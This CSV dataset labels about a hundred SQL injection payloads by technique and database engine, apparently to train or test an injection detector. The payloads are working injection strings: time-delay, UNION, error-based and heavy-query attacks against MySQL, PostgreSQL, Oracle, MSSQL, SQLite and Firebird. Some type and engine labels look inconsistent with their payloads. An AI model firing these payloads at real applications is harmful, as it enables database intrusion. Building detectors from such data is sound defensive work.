id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
19245,"1' in boolean mode ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) #",heavy_query,postgresql,0.95,Token match: 'generate_series (' → heavy_query (P4); DB=postgresql via \bgenerate_series\b; sources confirm (a_type+c_type),3
19246,"1' ) ) as peeo where 5356 = 5356 and elt ( 4722 = 2382,2382 ) --",boolean_blind,mysql,0.95,Token match: 'elt (' → boolean_blind (P3); DB=mysql via \belt\b; sources confirm (a_type+c_type),3
19247,"1'+ ( select ijck where 9961 = 9961 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) +'",boolean_blind,mysql,0.95,Token match: 'elt (' → boolean_blind (P3); DB=mysql via \belt\b; sources confirm (a_type),2
19248,"1' ) where 2121 = 2121 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.85,"Token match: 'where 2121 = 2121', 'from domain.domains as t1,domain.columns as t2,domain.tables as t3' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type)",3
19249,"1' ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( 'xjvr' = 'xjvr",heavy_query,generic,0.65,"Token match: 'from domain.domains as t1,domain.columns as t2,domain.tables as t3' → heavy_query (P4); DB=generic via no DB-specific signature; sources differ (a=boolean_blind,c=boolean_blind) — payload tokens prevail",1
19250,"-1270'|| ( select 'mgdi' where 6785 = 6785 union all select 6785,6785#",boolean_blind,generic,0.75,"Token match: 'where 6785 = 6785', 'union all select' → boolean_blind (P3); DB=generic via no DB-specific signature; sources differ (a=union_based,c=union_based) — payload tokens prevail",1
19251,"1"" ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( ""sdps"" = ""sdps",boolean_blind,mysql,0.95,"Token match: 'rlike (', 'sleep (' → boolean_blind (P3); DB=mysql via \bsleep\b; sources confirm (a_type+c_type)",3
19252,"1"" or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",time_blind,postgresql,0.95,Token match: 'pg_sleep (' → time_blind (P5); DB=postgresql via \bpg_sleep\b; sources confirm (a_type),2
19253,1%' ) ) ) rlike ( select ( case when ( 7697 = 3334 ) then 1 else 0x28 end ) ) and ( ( ( '%' = ',boolean_blind,mysql,0.95,Token match: 'rlike (' → boolean_blind (P3); DB=mysql via \brlike\b; sources confirm (a_type+c_type),3
19254,"1'|| ( select 'ymac' from dual where 9268 = 9268 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) ) ||'",boolean_blind,oracle,0.75,"Token match: 'where 9268 = 9268', 'benchmark (' → boolean_blind (P3); DB=oracle via \bdual\b; sources differ (a=time_blind,c=heavy_query) — payload tokens prevail",1
19255,waitfor delay '0:0:5' and ( 'gpqx' like 'gpqx,time_blind,mssql,0.95,Token match: 'waitfor delay' → time_blind (P5); DB=mssql via \bwaitfor\s+delay\b; sources confirm (a_type+c_type),3
19256,"-9997' union all select 9347,9347,9347,9347,9347,9347,9347,9347#",union_based,generic,0.95,Token match: 'union all select' → union_based (P7); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19257,1%' ) ) ) and 7533 = 7533 and ( ( ( '%' = ',boolean_blind,generic,0.85,Token match: 'and 7533 = 7533' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19258,1' ) ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( 'bwka' = 'bwka,boolean_blind,firebird,0.75,Token match: 'case 6240 when' → boolean_blind (P3); DB=firebird via rdb\$; sources confirm (a_type+c_type),3
19259,"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",union_based,generic,0.95,Token match: 'union all select' → union_based (P7); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19260,"1"" ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ""tbdl"" like ""tbdl",boolean_blind,mysql,0.95,"Token match: 'elt (', 'union select' → boolean_blind (P3); DB=mysql via \belt\b; sources confirm (a_type)",2
19261,"1"" ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( ""ecoa"" like ""ecoa",heavy_query,generic,0.65,"Token match: 'all_users t1,all_users t2' → heavy_query (P4); DB=generic via no DB-specific signature; sources differ (a=boolean_blind,c=boolean_blind) — payload tokens prevail",1
19262,"1%"" ) rlike sleep ( 5 ) #",time_blind,mysql,0.95,Token match: 'sleep (' → time_blind (P5); DB=mysql via \bsleep\b; sources confirm (a_type),2
19263,"1' ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( 'gtov' like 'gtov",boolean_blind,mysql,0.95,"Token match: 'elt (', 'sleep (' → boolean_blind (P3); DB=mysql via \bsleep\b; sources confirm (a_type)",2
19264,1' in boolean mode ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) #,boolean_blind,oracle,0.75,Token match: 'case when' → boolean_blind (P3); DB=oracle via \bdual\b; sources confirm (a_type+c_type),3
19265,"1' ) ) as qwdh where 7581 = 7581 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,0.75,Token match: 'where 7581 = 7581' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type),2
19266,select case when 3661 = 9315 then 1 else null end--,boolean_blind,generic,0.75,Token match: 'case when' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19267,"1'+ ( select 'asmj' where 7808 = 7808 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) ) +'",boolean_blind,oracle,0.75,"Token match: 'where 7808 = 7808', 'dbms_pipe.receive_message' → boolean_blind (P3); DB=oracle via \bdbms_pipe\b; sources differ (a=time_blind,c=time_blind) — payload tokens prevail",1
19268,"-1513"" ) as swvd where 2958 = 2958 union all select 2958,2958,2958--",boolean_blind,generic,0.75,"Token match: 'where 2958 = 2958', 'union all select' → boolean_blind (P3); DB=generic via no DB-specific signature; sources differ (a=union_based,c=union_based) — payload tokens prevail",1
19269,-2951 or 4189 = 2291,boolean_blind,generic,0.85,Token match: 'or 4189 = 2291' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19270,"1' in boolean mode ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) #",time_blind,mysql,0.95,Token match: 'benchmark (' → time_blind (P5); DB=mysql via \bbenchmark\b; sources confirm (a_type),2
19271,"1' ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",time_blind,sqlite,0.95,Token match: 'randomblob (' → time_blind (P5); DB=sqlite via \brandomblob\b; sources confirm (a_type),2
19272,1'|| ( select 'ytwz' from dual where 3025 = 3025 and ( 5039 = 5303 ) *5303 ) ||',boolean_blind,oracle,0.85,Token match: 'where 3025 = 3025' → boolean_blind (P3); DB=oracle via \bdual\b; sources confirm (a_type+c_type),3
19273,end and ( 9416 = 9416,benign,generic,0.85,No attack signals in payload 'end and ( 9416 = 9416'; no SQLi tokens (union/sleep/xmltype/and N=N/etc.) detected,2
19274,"1%' ) union all select null,null,null,null#",union_based,generic,0.95,Token match: 'union all select' → union_based (P7); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19275,"select * from generate_series ( 7536,7536,case when ( 7536 = 7523 ) then 1 else 0 end ) limit 1--",boolean_blind,postgresql,0.75,"Token match: 'case when', 'generate_series (' → boolean_blind (P3); DB=postgresql via \bgenerate_series\b; sources confirm (a_type+c_type)",3
19276,"1"" ) ) as femc where 1313 = 1313 and 4595 = 4595#",boolean_blind,generic,0.85,Token match: 'and 4595 = 4595' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19277,"1"" where 4298 = 4298 order by 1--",boolean_blind,generic,0.75,Token match: 'where 4298 = 4298' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (c_type),2
19278,-1468' ) ) ) or 4875 = 6163#,boolean_blind,generic,0.85,Token match: 'or 4875 = 6163' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19279,"1 ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.95,Token match: 'dbms_pipe.receive_message' → time_blind (P5); DB=oracle via \bdbms_pipe\b; sources confirm (a_type+c_type),3
19280,-3062' ) ) or 6872 = 6872 and ( ( 'uzth' like 'uzth,boolean_blind,generic,0.85,Token match: 'or 6872 = 6872' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19281,"-1407 where 1186 = 1186 union all select 1186,1186,1186,1186,1186--",boolean_blind,generic,0.75,"Token match: 'where 1186 = 1186', 'union all select' → boolean_blind (P3); DB=generic via no DB-specific signature; sources differ (a=union_based,c=union_based) — payload tokens prevail",1
19282,"-1370' ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( 'xmrg' = 'xmrg",boolean_blind,mysql,0.95,Token match: 'elt (' → boolean_blind (P3); DB=mysql via \belt\b; sources confirm (a_type),2
19283,"1%"" and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ""%"" = """,heavy_query,postgresql,0.95,Token match: 'generate_series (' → heavy_query (P4); DB=postgresql via \bgenerate_series\b; sources confirm (a_type+c_type),3
19284,"-9509 ) union all select 1193,1193,1193#",union_based,generic,0.95,Token match: 'union all select' → union_based (P7); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19285,"1"" ) ) as azak where 4911 = 4911",boolean_blind,generic,0.75,Token match: 'where 4911 = 4911' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (c_type),2
19286,"1 where 2267 = 2267 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",boolean_blind,oracle,0.75,"Token match: 'where 2267 = 2267', 'dbms_pipe.receive_message' → boolean_blind (P3); DB=oracle via \bdbms_pipe\b; sources differ (a=time_blind,c=time_blind) — payload tokens prevail",1
19287,"1' ) ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( 'qpuy' = 'qpuy",boolean_blind,mysql,0.95,Token match: 'elt (' → boolean_blind (P3); DB=mysql via \belt\b; sources confirm (a_type),2
19288,"1' where 8837 = 8837 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,generic,0.85,"Token match: 'where 8837 = 8837', 'all_users t1,all_users t2' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type)",3
19289,"1"" ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ""auyv"" = ""auyv",boolean_blind,oracle,0.75,"Token match: 'case when', 'xmltype (' → boolean_blind (P3); DB=oracle via \bxmltype\b; sources confirm (c_type)",2
19290,1' ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.95,Token match: 'pg_sleep (' → time_blind (P5); DB=postgresql via \bpg_sleep\b; sources confirm (a_type),2
19291,1' ) ) ) and 4595 = 4595#,boolean_blind,generic,0.85,Token match: 'and 4595 = 4595' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19292,"1 ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,0.95,Token match: 'dbms_pipe.receive_message' → time_blind (P5); DB=oracle via \bdbms_pipe\b; sources confirm (a_type+c_type),3
19293,"1"" ) as ymto where 3453 = 3453",boolean_blind,generic,0.75,Token match: 'where 3453 = 3453' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (c_type),2
19294,"-7320"" ) where 3907 = 3907 union all select 3907,3907--",boolean_blind,generic,0.75,"Token match: 'where 3907 = 3907', 'union all select' → boolean_blind (P3); DB=generic via no DB-specific signature; sources differ (a=union_based,c=union_based) — payload tokens prevail",1
19295,"1 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) # mafe",boolean_blind,mysql,0.65,"Token match: 'case when', 'extractvalue (' → boolean_blind (P3); DB=mysql via \bextractvalue\b; sources differ (a=error_based,c=heavy_query) — payload tokens prevail",1
19296,"-1663' or elt ( 1032 = 1032,3623 ) and 'yqaj' like 'yqaj",boolean_blind,mysql,0.95,Token match: 'elt (' → boolean_blind (P3); DB=mysql via \belt\b; sources confirm (a_type),2
19297,-3578' ) ) ) order by 1--,boolean_blind,generic,0.65,"Token match: 'order by 1--' → boolean_blind (P3); DB=generic via no DB-specific signature; sources differ (a=benign,c=benign) — payload tokens prevail",1
19298,"1%' ) ) ) union all select null,null,null#",union_based,generic,0.95,Token match: 'union all select' → union_based (P7); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19299,"select sleep ( 5 ) and ( ""tlbj"" like ""tlbj",time_blind,mysql,0.95,Token match: 'sleep (' → time_blind (P5); DB=mysql via \bsleep\b; sources confirm (a_type),2
19300,"1' ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( 'drvk' like 'drvk",boolean_blind,mysql,0.95,"Token match: 'elt (', 'union select' → boolean_blind (P3); DB=mysql via \belt\b; sources confirm (a_type)",2
19301,"1"" ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""zbwn"" like ""zbwn",time_blind,sqlite,0.95,Token match: 'randomblob (' → time_blind (P5); DB=sqlite via \brandomblob\b; sources confirm (a_type),2
19302,"1' in boolean mode ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) #",heavy_query,generic,0.65,"Token match: 'all_users t1,all_users t2' → heavy_query (P4); DB=generic via no DB-specific signature; sources differ (a=boolean_blind,c=boolean_blind) — payload tokens prevail",1
19303,"-3834' ) ) ) union all select 8313,8313--",union_based,generic,0.95,Token match: 'union all select' → union_based (P7); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19304,-8248 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ),boolean_blind,firebird,0.75,Token match: 'case 5903 when' → boolean_blind (P3); DB=firebird via rdb\$; sources confirm (a_type+c_type),3
19305,"1 ) ) as juoe where 9994 = 9994 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,firebird,0.85,"Token match: 'where 9994 = 9994', 'from rdb$fields as t1,rdb$types as t2,rdb$collations as t3' → boolean_blind (P3); DB=firebird via rdb\$; sources confirm (a_type+c_type)",3
19306,"1' where 8950 = 8950 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,generic,0.85,"Token match: 'where 8950 = 8950', 'all_users t1,all_users t2' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type)",3
19307,1' where 3701 = 3701 and 2006 = 2006,boolean_blind,generic,0.85,Token match: 'and 2006 = 2006' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19308,"-1668"" ) ) ) or 9323 = 9323#",boolean_blind,generic,0.85,Token match: 'or 9323 = 9323' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19309,"1 ) or elt ( 6272 = 6272,sleep ( 5 ) )",boolean_blind,mysql,0.95,"Token match: 'elt (', 'sleep (' → boolean_blind (P3); DB=mysql via \bsleep\b; sources confirm (a_type)",2
19310,"1"" ) rlike ( select ( case when ( 5746 = 5367 ) then 1 else 0x28 end ) ) and ( ""hnnf"" like ""hnnf",boolean_blind,mysql,0.95,Token match: 'rlike (' → boolean_blind (P3); DB=mysql via \brlike\b; sources confirm (a_type+c_type),3
19311,1' ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'cgiu' = 'cgiu,boolean_blind,oracle,0.75,Token match: 'case when' → boolean_blind (P3); DB=oracle via \bdual\b; sources confirm (a_type+c_type),3
19312,1' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 'jzpb' = 'jzpb,boolean_blind,oracle,0.75,"Token match: 'case when', 'xmltype (' → boolean_blind (P3); DB=oracle via \bxmltype\b; sources confirm (c_type)",2
19313,"1' ) where 8255 = 8255 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,generic,0.85,"Token match: 'where 8255 = 8255', 'all_users t1,all_users t2' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type)",3
19314,"1%"" ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( ""%"" = """,heavy_query,generic,0.65,"Token match: 'from domain.domains as t1,domain.columns as t2,domain.tables as t3' → heavy_query (P4); DB=generic via no DB-specific signature; sources differ (a=boolean_blind,c=boolean_blind) — payload tokens prevail",1
19315,"1'+ ( select pxsd where 2576 = 2576 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) ) +'",boolean_blind,mysql,0.95,"Token match: 'elt (', 'updatexml (' → boolean_blind (P3); DB=mysql via \bupdatexml\b; sources confirm (a_type)",2
19316,-2207%' ) or ( 8459 = 8459 ) *4906 and ( '%' = ',boolean_blind,generic,0.75,Token match: ') *4906 and' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type),2
19317,"1"" ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ""ubvd"" = ""ubvd",time_blind,mysql,0.95,Token match: 'benchmark (' → time_blind (P5); DB=mysql via \bbenchmark\b; sources confirm (a_type),2
19318,1' ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( 'cmqe' like 'cmqe,boolean_blind,mysql,0.95,"Token match: 'rlike (', 'sleep (' → boolean_blind (P3); DB=mysql via \bsleep\b; sources confirm (a_type+c_type)",3
19319,"-6766"" where 6591 = 6591 or make_set ( 9354 = 9354,7185 ) --",boolean_blind,generic,0.85,Token match: 'where 6591 = 6591' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19320,"select count ( * ) from generate_series ( 1,5000000 ) and ( 8997 = 8997",heavy_query,postgresql,0.95,Token match: 'generate_series (' → heavy_query (P4); DB=postgresql via \bgenerate_series\b; sources confirm (a_type+c_type),3
19321,-7610' or 3038 = 3038,boolean_blind,generic,0.85,Token match: 'or 3038 = 3038' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19322,1'|| ( select 'gmkp' where 6016 = 6016,boolean_blind,generic,0.85,Token match: 'where 6016 = 6016' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19323,"1, ( case when 6620 = 3092 then 1 else null end )",boolean_blind,generic,0.65,"Token match: 'case when' → boolean_blind (P3); DB=generic via no DB-specific signature; sources differ (a=benign,c=benign) — payload tokens prevail",1
19324,"1%"" ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ""%"" = """,heavy_query,firebird,0.65,"Token match: 'from rdb$fields as t1,rdb$types as t2,rdb$collations as t3' → heavy_query (P4); DB=firebird via rdb\$; sources differ (a=boolean_blind,c=boolean_blind) — payload tokens prevail",1
19325,"1 ) and elt ( 1210 = 1210,sleep ( 5 ) )",boolean_blind,mysql,0.95,"Token match: 'elt (', 'sleep (' → boolean_blind (P3); DB=mysql via \bsleep\b; sources confirm (a_type)",2
19326,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( 7240 = 7240",time_blind,oracle,0.95,Token match: 'dbms_pipe.receive_message' → time_blind (P5); DB=oracle via \bdual\b; sources confirm (a_type+c_type),3
19327,"-4155' ) ) ) union all select 1775,1775,1775,1775,1775,1775,1775--",union_based,generic,0.95,Token match: 'union all select' → union_based (P7); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19328,"-8021' ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'cenk' like 'cenk",boolean_blind,oracle,0.65,"Token match: 'case when', 'ctxsys.drithsx.sn' → boolean_blind (P3); DB=oracle via \bdual\b; sources differ (a=error_based,c=error_based) — payload tokens prevail",1
19329,"1%"" ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ""%"" = """,boolean_blind,mysql,0.95,"Token match: 'elt (', 'union select' → boolean_blind (P3); DB=mysql via \belt\b; sources confirm (a_type)",2
19330,"1, ( select ( case when ( 5433 = 5433 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )",boolean_blind,oracle,0.75,"Token match: 'case when', 'cast ( 1 as int' → boolean_blind (P3); DB=oracle via \bdual\b; sources confirm (a_type+c_type)",3
19331,"1 ) and elt ( 4249 = 4249,7259 ) and ( 8226 = 8226",boolean_blind,mysql,0.95,Token match: 'elt (' → boolean_blind (P3); DB=mysql via \belt\b; sources confirm (a_type),2
19332,-6190' ) ) ) union all select 9413--,union_based,generic,0.95,Token match: 'union all select' → union_based (P7); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19333,"1"" where 5372 = 5372 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.85,"Token match: 'where 5372 = 5372', 'from domain.domains as t1,domain.columns as t2,domain.tables as t3' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type)",3
19334,"-4653' or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,generic,0.75,Token match: 'case when' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type),2
19335,1' ) ) and 6690 = 3250#,boolean_blind,generic,0.85,Token match: 'and 6690 = 3250' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19336,( select * from ( select ( sleep ( 5 ) ) ) srmq ) ) ||',time_blind,mysql,0.95,Token match: 'sleep (' → time_blind (P5); DB=mysql via \bsleep\b; sources confirm (a_type),2
19337,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'vwxg' = 'vwxg",boolean_blind,generic,0.75,Token match: 'char ( 65 ) ||char' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type),2
19338,select ( case when ( 2676 = 4191 ) then 2676 else 1/ ( select 0 ) end ) --,boolean_blind,generic,0.75,Token match: 'case when' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19339,-6548 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) -- rlda,boolean_blind,oracle,0.75,Token match: 'case when' → boolean_blind (P3); DB=oracle via \bdual\b; sources confirm (a_type+c_type),3
19340,"select * from generate_series ( 9863,9863,case when ( 9863 = 3285 ) then 1 else 0 end ) limit 1--",boolean_blind,postgresql,0.75,"Token match: 'case when', 'generate_series (' → boolean_blind (P3); DB=postgresql via \bgenerate_series\b; sources confirm (a_type+c_type)",3
19341,"1'|| ( select 'yaii' from dual where 7317 = 7317 union all select null,null,null,null,null,null,null,null,null#",boolean_blind,oracle,0.75,"Token match: 'where 7317 = 7317', 'union all select' → boolean_blind (P3); DB=oracle via \bdual\b; sources differ (a=union_based,c=union_based) — payload tokens prevail",1
19342,"1"" or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,generic,0.65,"Token match: 'all_users t1,all_users t2' → heavy_query (P4); DB=generic via no DB-specific signature; sources differ (a=boolean_blind,c=boolean_blind) — payload tokens prevail",1
19343,"-5591%"" ) ) order by 1--",boolean_blind,generic,0.65,"Token match: 'order by 1--' → boolean_blind (P3); DB=generic via no DB-specific signature; sources differ (a=benign,c=benign) — payload tokens prevail",1
